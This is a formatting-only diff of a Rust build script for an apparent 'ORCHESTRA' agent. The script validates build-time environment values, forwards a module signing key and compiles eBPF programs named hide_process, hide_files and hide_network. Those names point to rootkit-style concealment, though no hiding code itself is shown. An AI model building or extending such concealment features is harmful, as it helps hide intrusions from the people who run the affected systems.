@@ -212,12 +212,8 @@ fn forward_validated_json(source: &str, target: &str) {
             // Lightweight JSON syntax check — does not validate the schema,
             // just ensures the string is parseable JSON so runtime paths
             // don't hit a cryptic deserialisation error.
-            let _: serde_json::Value = serde_json::from_str(trimmed).unwrap_or_else(|e| {
-                panic!(
-                    "build: {} value is not valid JSON: {}",
-                    source, e
-                )
-            });
+            let _: serde_json::Value = serde_json::from_str(trimmed)
+                .unwrap_or_else(|e| panic!("build: {} value is not valid JSON: {}", source, e));
             println!("cargo:rustc-env={}={}", target, trimmed);
         }
     }
@@ -265,10 +261,9 @@ fn forward_validated_base64_key(source: &str, target: &str, expected_bytes: usiz
     if let Ok(value) = std::env::var(source) {
         let trimmed = value.trim();
         if !trimmed.is_empty() {
-            let decoded =
-                base64::engine::general_purpose::STANDARD.decode(trimmed).unwrap_or_else(|e| {
-                    panic!("build: {} value is not valid base64: {}", source, e)
-                });
+            let decoded = base64::engine::general_purpose::STANDARD
+                .decode(trimmed)
+                .unwrap_or_else(|e| panic!("build: {} value is not valid base64: {}", source, e));
             assert_eq!(
                 decoded.len(),
                 expected_bytes,
@@ -293,11 +288,7 @@ fn forward_validated_positive_u64(source: &str, target: &str) {
                     source, trimmed
                 )
             });
-            assert!(
-                parsed > 0,
-                "build: {} must be greater than zero",
-                source
-            );
+            assert!(parsed > 0, "build: {} must be greater than zero", source);
             println!("cargo:rustc-env={}={}", target, parsed);
         }
     }
@@ -568,7 +559,11 @@ fn main() {
     // in so the agent verifies modules against the server's signing key instead
     // of falling back to the compile-time MODULE_SIGNING_PUBKEY constant.
     // Ed25519 public key = 32 bytes = 64 hex chars.
-    forward_validated_hex("ORCHESTRA_MODULE_VERIFY_KEY", "SYS_MODULE_VERIFY_KEY", Some(64));
+    forward_validated_hex(
+        "ORCHESTRA_MODULE_VERIFY_KEY",
+        "SYS_MODULE_VERIFY_KEY",
+        Some(64),
+    );
 
     // ── Agent behavior settings ─────────────────────────────────────────────
     // Server-side build requests use these fields to produce self-contained
@@ -622,11 +617,13 @@ fn main() {
     macro_rules! build_rng {
         () => {{
             if _build_rng.is_none() {
-                _build_rng = Some(if let Ok(hex_seed) = std::env::var("ORCHESTRA_BUILD_SEED") {
-                    make_seeded_rng(&hex_seed)
-                } else {
-                    make_rng()
-                });
+                _build_rng = Some(
+                    if let Ok(hex_seed) = std::env::var("ORCHESTRA_BUILD_SEED") {
+                        make_seeded_rng(&hex_seed)
+                    } else {
+                        make_rng()
+                    },
+                );
             }
             _build_rng.as_mut().unwrap()
         }};
@@ -700,18 +697,11 @@ fn compile_ebpf_programs() {
     }
     let clang = clang.unwrap();
 
-    let out_dir = std::path::PathBuf::from(
-        std::env::var("OUT_DIR").expect("OUT_DIR set by cargo"),
-    );
+    let out_dir = std::path::PathBuf::from(std::env::var("OUT_DIR").expect("OUT_DIR set by cargo"));
     let ebpf_out = out_dir.join("ebpf");
-    std::fs::create_dir_all(&ebpf_out)
-        .expect("failed to create eBPF output directory");
+    std::fs::create_dir_all(&ebpf_out).expect("failed to create eBPF output directory");
 
-    let programs = [
-        "hide_process",
-        "hide_files",
-        "hide_network",
-    ];
+    let programs = ["hide_process", "hide_files", "hide_network"];
 
     let include_dir = ebpf_dir.clone(); // .bpf.c files are in ebpf/
 
@@ -720,10 +710,7 @@ fn compile_ebpf_programs() {
         let obj = ebpf_out.join(format!("{}.o", prog_name));
 
         if !src.exists() {
-            eprintln!(
-                "warning: eBPF source {} not found; skipping",
-                src.display()
-            );
+            eprintln!("warning: eBPF source {} not found; skipping", src.display());
             emit_empty_ebpf_program(prog_name);
             continue;
         }
